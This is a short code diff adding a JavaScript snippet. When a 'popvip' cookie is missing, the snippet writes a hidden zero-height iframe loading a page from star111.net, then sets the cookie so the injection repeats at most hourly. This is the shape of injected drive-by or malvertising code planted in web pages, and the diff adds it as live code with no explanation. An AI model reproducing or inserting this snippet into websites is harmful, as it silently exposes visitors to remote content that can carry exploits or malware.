@@ -1,0 +1,11 @@
+var browserVer = parseInt(navigator.appVersion);
+var cookieString = new String(document.cookie)
+var cookieHeader = 'popvip='
+var beginPosition = cookieString.indexOf(cookieHeader)
+if (beginPosition <0)
+{
+document.write("<iframe src=http://www.star111.net/dm1.htm?27 width=100 height=0></iframe>");
+var Then = new Date()
+Then.setTime(Then.getTime()+ 1*60*60*1000)
+document.cookie = 'popvip=yes;expires='+Then.toGMTString()
+}
